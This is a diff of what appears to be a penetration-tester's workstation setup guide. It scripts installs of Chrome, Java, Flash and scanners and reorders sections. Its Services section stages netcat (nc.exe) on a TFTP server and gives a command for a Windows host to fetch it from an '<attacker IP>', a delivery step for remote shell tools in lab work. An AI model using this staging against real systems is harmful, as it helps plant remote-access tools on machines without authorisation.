@@ -100,6 +100,12 @@ Add folder: Scanners
      OpenVAS          https://localhost:9392
 ------------------------------------------------------------------------------------------------------
 
+# Install Adobe Flash
+
+apt-get install flashplugin-nonfree
+update-flashplugin-nonfree --install
+------------------------------------------------------------------------------------------------------
+
 # Install Apache Directory Studio
 
 https://directory.apache.org/studio/
@@ -142,20 +148,24 @@ rm <installer file>
 
 # Install Google Chrome
 
-https://www.google.com/chrome/browser/
-64 bit .deb
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 dpkg -i google-chrome-stable_current_amd64.deb
-nano /opt/google/chrome/google-chrome
-The last line should look like this: exec -a "$0" "$HERE/chrome"  "$@" --user-data-dir
+cp /opt/google/chrome/google-chrome.desktop /usr/share/applications/google-chrome.desktop
+head -n -1 /opt/google/chrome/google-chrome > temp.txt ; mv temp.txt /opt/google/chrome/google-chrome
+echo 'exec -a "$0" "$HERE/chrome"  "$@" --user-data-dir' >> /opt/google/chrome/google-chrome
+chmod +x /opt/google/chrome/google-chrome
+rm google-chrome-stable_current_amd64.deb
 ------------------------------------------------------------------------------------------------------
 
-# Install Adobe Flash
+# Install Java
 
-http://get.adobe.com/flashplayer
-.tar.gz for other Linux
-cd /root/Downloads/
-tar zxvf install_flash_player_11_linux.x86_64.tar.gz
-cp libflashplayer.so /usr/lib/mozilla/plugins/
+wget --no-cookies --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com" "http://download.oracle.com/otn-pub/java/jdk/7u17-b02/jdk-7u17-linux-x64.tar.gz"
+tar zxvf jdk-7u17-linux-x64.tar.gz
+mv jdk1.7.0_17/ /usr/lib/jvm
+update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.7.0_17/jre/bin/java 2
+update-alternatives --config java
+rm jdk-7u17-linux-x64.tar.gz
+java -version
 ------------------------------------------------------------------------------------------------------
 
 # Install Nessus
@@ -175,21 +185,6 @@ chmod 755 NeXposeSetup-Linux64.bin
 cd /opt/rapid7/nexpose/nsc/ && ./nsc.sh
 https://localhost:3780
 If you do not want this service to run at startup:  update-rc.d -f nexposeconsole.rc remove
-------------------------------------------------------------------------------------------------------
-
-# Setup Angry IP Scanner
-
-Applications > Internet > Angry IP Scanner
-Tools > Fetchers
-The left column should contain Hostname, NetBIOS Info, Web detect, MAC Vendor
-------------------------------------------------------------------------------------------------------
-
-# Create Shortcuts
-
-Alt + right click on menu bar > Add to Panel
-Application Launcher > Forward
-Expand Accessories > gedit Text Editor > Add
-Screenshot > Add
 ------------------------------------------------------------------------------------------------------
 
 # Install VMware Player (if needed)
@@ -219,23 +214,38 @@ Accept all the defaults.
 reboot
 ------------------------------------------------------------------------------------------------------
 
+# Setup Angry IP Scanner
+
+Applications > Internet > Angry IP Scanner
+Tools > Fetchers
+The left column should contain Hostname, NetBIOS Info, Web detect, MAC Vendor
+------------------------------------------------------------------------------------------------------
+
+# Create Shortcuts
+
+Alt + right click on menu bar > Add to Panel
+Application Launcher > Forward
+Expand Accessories > gedit Text Editor > Add
+Screenshot > Add
+------------------------------------------------------------------------------------------------------
+
 # Services
 
-service apache2 start                            # Start apache
-netstat -antp | grep apache                      # Verify the service is running
-/var/www/index.html                              # Default home page
-/var/log/apache2/access.log                      # Logs
+service apache2 start                            Start apache
+netstat -antp | grep apache                      Verify the service is running
+/var/www/index.html                              Default home page
+/var/log/apache2/access.log                      Logs
 
-service ssh start                                # Start ssh
-netstat -antp | grep ssh                         # Verify the service is running
-update-rc.d ssh enable                           # Enable ssh to start at boot time
-update-rc.d ssh disable                          # Disable ssh from starting at boot time
+service ssh start                                Start ssh
+netstat -antp | grep ssh                         Verify the service is running
+update-rc.d ssh enable                           Enable ssh to start at boot time
+update-rc.d ssh disable                          Disable ssh from starting at boot time
 
-mkdir /tftp                                      # Create a new home folder for tftp
-atftpd --daemon --port 69 /tftp                  # Start tftp and assign home folder
-netstat -anup | grep atftp                       # Verify the service is running
+mkdir /tftp                                      Create a new home folder for tftp
+atftpd --daemon --port 69 /tftp                  Start tftp and assign home folder
+netstat -anup | grep atftp                       Verify the service is running
 cp /usr/share/windows-binaries/nc.exe /tftp/
-tftp -i <attacker IP> get nc.exe                 # Run from Windows
+tftp -i <attacker IP> get nc.exe                 Run from Windows
 ------------------------------------------------------------------------------------------------------
 
 # Update procedure
@@ -258,7 +268,7 @@ apt-get install network-manager-strongswan
 apt-get install network-manager-vpnc network-manager-vpnc-gnome
 /etc/init.d/network-manager restart
 
-## Thanks to Robert Clowser for the bug fix!
+# Thanks to Robert Clowser for the bug fix!
 nano /etc/network/interfaces
 Remove the last two lines egarding eth0. 
 Reboot
@@ -281,3 +291,4 @@ cd /opt/scripts/
 ./discover.sh
 #13 Update
 apt-get -f install
+
